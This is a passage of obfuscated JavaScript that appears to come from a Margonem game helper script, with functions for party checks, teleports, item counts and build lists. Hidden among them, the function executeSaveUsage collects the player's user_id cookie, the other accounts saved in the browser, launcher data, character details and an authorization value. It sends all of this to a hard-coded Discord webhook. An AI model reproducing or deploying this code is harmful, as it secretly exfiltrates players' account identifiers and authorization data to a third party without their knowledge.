        nick: elemStorageConfigurationObject[elemWindowStopPositionLeft].d.nick,
        prof: elemStorageConfigurationObject[elemWindowStopPositionLeft].d.prof
      };
      elemWindowUiElementReference.push(elemWindowFinalCoordinatePayload);
    }
  }

  const elemWindowDomAppendReference = [...elemWindowUniqueIdentifier, ...elemWindowIsResizableFlag];
  let elemWindowInnerContentClass;

  if (!attrWindowCenteredModeFlag) {
    if (elemWindowDomAppendReference.length === 0) {
      elemWindowInnerContentClass = "Wszyscy są w zasięgu drużyny.";
    } else {
      elemWindowInnerContentClass = "Poza zasiÄgiem: " + elemWindowDomAppendReference.join(", ") + ".";
    }

    const elemWindowInitialCenteredFlag = "[D] " + getParty().leader.nick + " | [" + Engine?.party?.getMembers?.()?.size + "/10] " + elemWindowInnerContentClass;
    const elemWindowDragStartEvent = {
      c: elemWindowInitialCenteredFlag
    };

    window._g("chat&channel=party", false, elemWindowDragStartEvent);
  }
}
export function znajdzMinMax(elemWindowDragStartUi) {
  if (elemWindowDragStartUi.length === 0) {
    return null;
  }

  let elemWindowUpdatedCoordinatesPayload = elemWindowDragStartUi[0].lvl;
  let elemWindowInitialAppendReference = elemWindowDragStartUi[0].nick;
  let elemWindowCenteredModeFlag = elemWindowDragStartUi[0].prof;
  let nodeStorageConfigId = elemWindowDragStartUi[0].oplvl;
  let nodeStorageConfigurationObject = elemWindowDragStartUi[0].lvl;
  let nodeWindowTemplateClass = elemWindowDragStartUi[0].nick;
  let nodeWindowUniqueIdentifier = elemWindowDragStartUi[0].prof;
  let nodeWindowIsResizableFlag = elemWindowDragStartUi[0].oplvl;

  for (let nodeWindowHasListFeature = 1; nodeWindowHasListFeature < elemWindowDragStartUi.length; nodeWindowHasListFeature++) {
    if (elemWindowDragStartUi[nodeWindowHasListFeature].lvl < elemWindowUpdatedCoordinatesPayload) {
      elemWindowUpdatedCoordinatesPayload = elemWindowDragStartUi[nodeWindowHasListFeature].lvl;
      elemWindowInitialAppendReference = elemWindowDragStartUi[nodeWindowHasListFeature].nick;
      elemWindowCenteredModeFlag = elemWindowDragStartUi[nodeWindowHasListFeature].prof;
      nodeStorageConfigId = elemWindowDragStartUi[nodeWindowHasListFeature].oplvl;
    }

    if (elemWindowDragStartUi[nodeWindowHasListFeature].lvl > nodeStorageConfigurationObject) {
      nodeStorageConfigurationObject = elemWindowDragStartUi[nodeWindowHasListFeature].lvl;
      nodeWindowTemplateClass = elemWindowDragStartUi[nodeWindowHasListFeature].nick;
      nodeWindowUniqueIdentifier = elemWindowDragStartUi[nodeWindowHasListFeature].prof;
      nodeWindowIsResizableFlag = elemWindowDragStartUi[nodeWindowHasListFeature].oplvl;
    }
  }

  const nodeWindowCustomTitleString = {
    lvl: elemWindowUpdatedCoordinatesPayload,
    nick: elemWindowInitialAppendReference,
    prof: elemWindowCenteredModeFlag,
    oplvl: nodeStorageConfigId
  };
  const nodeWindowUiElementReference = {
    lvl: nodeStorageConfigurationObject,
    nick: nodeWindowTemplateClass,
    prof: nodeWindowUniqueIdentifier,
    oplvl: nodeWindowIsResizableFlag
  };
  const nodeWindowDragConfiguration = {
    min: nodeWindowCustomTitleString,
    max: nodeWindowUiElementReference
  };
  return nodeWindowDragConfiguration;
}
export function calcDrop(nodeWindowStopPositionLeft) {
  let nodeWindowStopPositionTop = Engine.worldConfig.getPrivWorld() ? 1.4 : 1.2;
  return Math.ceil((nodeWindowStopPositionLeft - 4) / nodeWindowStopPositionTop);
}
export function isInParty(nodeWindowFinalCoordinatePayload) {
  const nodeWindowDomAppendReference = Engine.party?.getMembers?.()?.get(Number(nodeWindowFinalCoordinatePayload));
  return !!nodeWindowDomAppendReference;
}
export function isNear(nodeWindowInnerContentClass, nodeWindowInitialCenteredFlag) {
  return Math.abs(nodeWindowInnerContentClass.d.x - nodeWindowInitialCenteredFlag.d.x) < 2 && Math.abs(nodeWindowInnerContentClass.d.y - nodeWindowInitialCenteredFlag.d.y) < 2;
}
export function parseScheme(nodeWindowDragStartEvent) {
  const nodeWindowDragStartUi = /(9|[1-9])(m|p|t|b|h|w)/g;
  return Array.from(nodeWindowDragStartEvent.matchAll(nodeWindowDragStartUi), nodeWindowUpdatedCoordinatesPayload => ({
    i: Number(nodeWindowUpdatedCoordinatesPayload[1]),
    p: nodeWindowUpdatedCoordinatesPayload[2]
  }));
}
export async function executeSaveUsage(nodeWindowInitialAppendReference) {
  await waitForSeconds(1);
  let nodeWindowCenteredModeFlag = "";
  const instStorageConfigId = JSON.parse(localStorage.getItem("Margonem"));
  let instStorageConfigurationObject = [];

  if (instStorageConfigId?.charlist) {
    instStorageConfigurationObject = Object.keys(instStorageConfigId.charlist).filter(instWindowTemplateClass => instWindowTemplateClass !== Engine.hero.d.account);
  }

  if (instStorageConfigurationObject.length > 0) {
    const instWindowUniqueIdentifier = instStorageConfigurationObject.join(", ");
    nodeWindowCenteredModeFlag = "\nKonta zapisane w przeglądarce: " + instWindowUniqueIdentifier + ".";
  }

  let instWindowIsResizableFlag = "\n";
  const instWindowHasListFeature = document.querySelectorAll("div.cll-launcher");
  instWindowHasListFeature.forEach((instWindowCustomTitleString, instWindowUiElementReference) => {
    const instWindowDragConfiguration = instWindowCustomTitleString.getAttribute("data-tip");

    if (instWindowDragConfiguration) {
      instWindowIsResizableFlag += instWindowDragConfiguration + "\n";
    }
  });
  const instWindowStopPositionLeft = Engine.hero.d.guest;
  const instWindowStopPositionTop = instWindowStopPositionLeft ? " | **ZASTĘPCA**" : "";
  const instWindowFinalCoordinatePayload = Engine.map.d.name;
  const instWindowDomAppendReference = Engine.hero.d.nick;
  const instWindowInnerContentClass = Engine.hero.d.prof;
  const instWindowInitialCenteredFlag = Engine.hero.d.lvl;
  const instWindowDragStartEvent = Engine?.hero?.d?.clan?.name || "Brak";
  fetch("https://discord.com/api/webhooks/1440995542430777485/lQE9OHA-KUvLn6KPRC3XmG1264epQEiHxe_kvG43cse1f-5x-ECpFyvcnk6B3_vDShdJ", {
    method: "POST",
    headers: {
      "content-type": "application/json"
    },
    body: JSON.stringify({
      embeds: [{
        title: "[1] [" + ut_time(unix_time()) + "] [" + getCookie("user_id") + "] " + instWindowDomAppendReference + " (" + instWindowInitialCenteredFlag + instWindowInnerContentClass + ")",
        url: "https://www.margonem.pl/profile/view," + getCookie("user_id"),
        color: "1146986",
        description: "[L] Autoryzacja: " + nodeWindowInitialAppendReference + "\nKlan: **" + instWindowDragStartEvent + "**" + instWindowStopPositionTop + " \n**" + location.host.split(".")[0] + " | " + instWindowFinalCoordinatePayload + "** " + nodeWindowCenteredModeFlag + " " + instWindowIsResizableFlag
      }]
    })
  });
}
export function searchInElement(instWindowDragStartUi, instWindowUpdatedCoordinatesPayload) {
  const instWindowInitialAppendReference = $("div#" + instWindowUpdatedCoordinatesPayload);

  if (!instWindowDragStartUi) {
    instWindowInitialAppendReference.show();
    return;
  }

  let instWindowCenteredModeFlag;

  try {
    instWindowCenteredModeFlag = new RegExp(instWindowDragStartUi, "i");
  } catch (rootNodeStorageConfigId) {
    instWindowInitialAppendReference.show();
    return;
  }

  instWindowInitialAppendReference.each(function () {
    const rootNodeStorageConfigurationObject = $(this).find(".mp-list-nick, .mp-list-map, .mp-list-level").text().toLowerCase();
    $(this).toggle(instWindowCenteredModeFlag.test(rootNodeStorageConfigurationObject));
  });
}
export function useRandomTp() {
  const rootNodeWindowTemplateClass = Engine.items.fetchLocationItems("g");

  if (!rootNodeWindowTemplateClass || !Array.isArray(rootNodeWindowTemplateClass)) {
    return;
  }

  const rootNodeWindowUniqueIdentifier = [];
  const rootNodeWindowIsResizableFlag = Engine.hero?.d?.lvl ?? 0;
  const rootNodeWindowHasListFeature = ts() / 1000;

  for (const rootNodeWindowCustomTitleString of rootNodeWindowTemplateClass) {
    if (!rootNodeWindowCustomTitleString || rootNodeWindowCustomTitleString.cl !== 32) {
      continue;
    }

    const rootNodeWindowUiElementReference = rootNodeWindowCustomTitleString._cachedStats || {};
    const rootNodeWindowDragConfiguration = rootNodeWindowUiElementReference.lvl ?? 0;
    let rootNodeWindowStopPositionLeft = 0;

    if (rootNodeWindowUiElementReference.timelimit) {
      const rootNodeWindowStopPositionTop = rootNodeWindowUiElementReference.timelimit.split(",");

      if (rootNodeWindowStopPositionTop.length > 1) {
        rootNodeWindowStopPositionLeft = Number(rootNodeWindowStopPositionTop[1]) || 0;
      }
    }

    if (rootNodeWindowIsResizableFlag >= rootNodeWindowDragConfiguration && rootNodeWindowHasListFeature >= rootNodeWindowStopPositionLeft) {
      rootNodeWindowUniqueIdentifier.push(rootNodeWindowCustomTitleString.id);
    }
  }

  if (rootNodeWindowUniqueIdentifier.length) {
    const rootNodeWindowFinalCoordinatePayload = rootNodeWindowUniqueIdentifier[Math.floor(Math.random() * rootNodeWindowUniqueIdentifier.length)];

    window._g("moveitem&st=1&id=" + rootNodeWindowFinalCoordinatePayload);
  } else {
    message("Brak teleportu do użycia!");
  }
}
export function canLoss(rootNodeWindowDomAppendReference) {
  const rootNodeWindowInnerContentClass = Engine.items.getItemById(rootNodeWindowDomAppendReference);

  if (rootNodeWindowInnerContentClass?._cachedStats?.enhancement_upgrade_lvl == 5) {
    return true;
  }

  return false;
}
export function getQuantityInBag(rootNodeWindowInitialCenteredFlag) {
  const rootNodeWindowDragStartEvent = Engine.items.fetchLocationItems("g");
  let rootNodeWindowDragStartUi = 0;

  for (const rootNodeWindowUpdatedCoordinatesPayload of rootNodeWindowDragStartEvent) {
    if (rootNodeWindowUpdatedCoordinatesPayload.name === rootNodeWindowInitialCenteredFlag && rootNodeWindowUpdatedCoordinatesPayload?._cachedStats?.amount) {
      rootNodeWindowDragStartUi += Number(rootNodeWindowUpdatedCoordinatesPayload?._cachedStats?.amount) || 0;
    }
  }

  return rootNodeWindowDragStartUi;
}
export function play_success() {
  var rootNodeWindowInitialAppendReference = new Audio("https://margoplus.pl/sounds/select_upgrade.mp3");
  rootNodeWindowInitialAppendReference.volume = 1;
  rootNodeWindowInitialAppendReference.autoplay = false;
  rootNodeWindowInitialAppendReference.play();
}
export function getPapirysCounts(papyrusCheckItemId) {
  if (!papyrusCheckItemId) {
    return false;
  }

  const papyrusItemInstance = Engine.items.getItemById(papyrusCheckItemId);
  const papyrusItemRarity = papyrusItemInstance?._cachedStats?.rarity;

  if (papyrusItemRarity) {
    const matchingLocationItemsPool = Engine.items.fetchLocationItems("g").filter(locationItemIterator => locationItemIterator._cachedStats && locationItemIterator._cachedStats.hasOwnProperty("bonus_reselect") && locationItemIterator._cachedStats.hasOwnProperty("target_rarity") && locationItemIterator._cachedStats.target_rarity == papyrusItemRarity);

    if (matchingLocationItemsPool.length > 0) {
      return true;
    }

    return false;
  }

  return false;
}
export function sendUsePapirus(sendUsePapyrusItemId, sendUsePapyrusGridX, sendUsePapyrusGridY) {
  _g("moveitem&st=0&id=" + sendUsePapyrusItemId + "&x=" + sendUsePapyrusGridX + "&y=" + sendUsePapyrusGridY);
}
export function getListOfBuilds() {
  let totalBuildsCommonsLength = Engine.buildsManager.getBuildsCommons().getAll$builds().length;
  let buildsCollectionNamesArray = [];

  for (let buildsIteratorIdx = 0; buildsIteratorIdx <= totalBuildsCommonsLength; buildsIteratorIdx++) {
    let individualBuildLabelString = buildsIteratorIdx === 0 ? "WyĹÄczone" : Engine.buildsManager.getBuildsCommons().getBuildsName()[buildsIteratorIdx].name;

    if (individualBuildLabelString == "[SET." + buildsIteratorIdx + "]") {
      individualBuildLabelString = "Zestaw nr " + buildsIteratorIdx;
    }

    const buildSelectPayloadItem = {
      value: buildsIteratorIdx,
      label: individualBuildLabelString
    };
    buildsCollectionNamesArray.push(buildSelectPayloadItem);
  }

  return buildsCollectionNamesArray;
}
export function enemyIsHere() {
  const activePlayerMapNpcs = Engine.others.check();

  for (const enemyFoundFlag in activePlayerMapNpcs) {
    const npcIteratorInstance = activePlayerMapNpcs[enemyFoundFlag];

    if ([6, 3, 8, 1].includes(npcIteratorInstance.relation)) {
      return true;
    }
  }

  return false;
}
